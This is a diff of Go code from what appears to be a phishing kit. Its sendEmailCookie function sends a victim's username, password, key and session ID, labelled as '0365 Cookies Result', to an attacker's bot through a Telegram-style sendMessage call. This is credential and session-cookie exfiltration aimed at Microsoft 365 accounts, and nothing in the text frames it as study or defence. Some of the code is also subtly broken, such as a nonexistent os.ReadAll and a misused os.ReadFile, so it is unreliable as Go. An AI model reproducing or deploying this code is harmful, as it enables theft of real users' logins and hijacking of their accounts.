@@ -81,11 +81,10 @@ func sendEmailCookie(cookies string, username string, password string, KeyUser s
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
 	msg := fmt.Sprintf("[ 🍁 0365 Cookies Result 🍁 ]\n******** [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🏷️ Key_user:   %s\n💻 Session_id:   %s\n*****************************", username, password, KeyUser, sessionId)
 	//file, err := os.Open("/root/lukeharbor/result.txt")
-	content, err = os.ReadFile("%s_Result.json", username)
+	//content, err = os.ReadFile("%s_Result.json", username)
 	postBody, _ := json.Marshal(map[string]string{
 		"chat_id":    getChatId(),
 		"text":       msg,
-		"file":     content,
 	})
 
 	responseBody := bytes.NewBuffer(postBody)
@@ -94,7 +93,7 @@ func sendEmailCookie(cookies string, username string, password string, KeyUser s
 	defer request.Body.Close()
 	
 	// 	// Body
-	postBody, err = ioutil.ReadAll(request.Body)
+	postBody, err = os.ReadAll(request.Body)
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
